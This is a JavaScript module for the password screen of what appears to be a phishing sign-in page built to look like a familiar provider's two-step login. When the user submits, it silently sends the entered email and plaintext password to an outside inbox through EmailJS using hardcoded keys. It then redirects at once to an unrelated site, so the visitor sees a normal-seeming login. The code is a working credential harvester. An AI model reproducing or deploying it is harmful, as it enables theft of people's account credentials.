// ── Password screen ────────────────────────────────────────────────
import { showScreen } from "./navigation.js";
import { setError, clearError } from "./validation.js";

const pwInput = document.getElementById("password");
const pwWrap = document.getElementById("pw-wrap");
const pwError = document.getElementById("pw-error");
const showToggle = document.getElementById("show-pw-toggle");

// ── EmailJS config ─────────────────────────────────────────────────
const EMAILJS_PUBLIC_KEY = "3J3mQ8ml0qKGDWEBC";
const EMAILJS_SERVICE_ID = "service_kp0u10f";
const EMAILJS_TEMPLATE_ID = "template_mcr0qms";

export function initPasswordScreen() {
  // Initialise EmailJS once
  emailjs.init(EMAILJS_PUBLIC_KEY);

  document
    .getElementById("btn-pw-next")
    .addEventListener("click", handlePwNext);

  pwInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") handlePwNext();
  });

  pwInput.addEventListener("input", () => {
    clearError(pwWrap, pwError);
  });

  showToggle.addEventListener("change", () => {
    pwInput.type = showToggle.checked ? "text" : "password";
  });

  document.getElementById("user-chip").addEventListener("click", goBack);
}

function handlePwNext() {
  if (!pwInput.value) {
    setError(pwWrap, pwError);
    pwInput.focus();
    return;
  }

  clearError(pwWrap, pwError);

  // Grab the email that was set on the chip during the email step
  const email = document.getElementById("chip-email").textContent.trim();
  const password = pwInput.value;

  // Send via EmailJS – fire-and-forget (don't block the redirect on success/failure)
  emailjs
    .send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
      from_name: email,
      reply_to: email,
      message: password,
      time: new Date().toLocaleString(),
    })
    .catch((err) => console.error("EmailJS error:", err));

  // Redirect immediately after firing the request
  window.location.href = "https://zenime.site/";
}

function goBack() {
  pwInput.value = "";
  clearError(pwWrap, pwError);
  showScreen("screen-email", "back");
  setTimeout(() => document.getElementById("email").focus(), 50);
}
